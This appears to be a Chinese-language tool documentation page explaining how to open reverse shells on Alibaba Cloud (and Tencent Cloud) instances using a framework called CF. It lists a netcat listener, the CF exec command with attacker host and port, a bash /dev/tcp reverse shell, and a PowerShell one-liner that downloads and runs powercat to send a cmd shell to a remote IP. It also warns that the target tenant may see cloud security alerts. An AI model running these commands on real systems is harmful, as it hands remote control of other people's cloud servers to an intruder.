---
title: 反弹 Shell
---

## 反弹 Shell

首先在自己的主机上开启监听

```bash
nc -lvvp 4444
```

接着在 CF 中执行反弹 Shell 命令

`--lhost` 参数配置为自己监听主机的 IP，`--lport` 参数配置为自己的监听端口，`-i` 设置要反弹 Shell 的实例 ID（如果未指定具体的实例，则 CF 会提醒是否是选择全部实例还是某个实例。）

```bash
cf alibaba ecs exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
```

在 CF 中使用的 Linux 反弹 Shell 如下

```bash
bash -i >& /dev/tcp/123.123.123.123/4444 0>&1
```

在 CF 中使用的 Windows 反弹 Shell 如下


```bash
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.123.123.123 -p 4444 -e cmd
```

> 由于 CF 等待命令执行结果的默认时间是 60 秒，所以在超过 60 秒后，CF 会提示命令执行超时，从而退出程序。
>
> 因为反弹 Shell 需要命令保持一直处于执行状态，所以在上面的图片里可以看到提示命令执行超时。

::: warning 注意

在阿里云下反弹 Shell ，目标租户可能会收到阿里云的云盾告警消息，所以此操作需谨慎。

:::

如果想在腾讯云下执行这些命令，只需要使用 `cf tencent` 跟上对应的命令即可。

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年7月18日"
    }
  }
</script>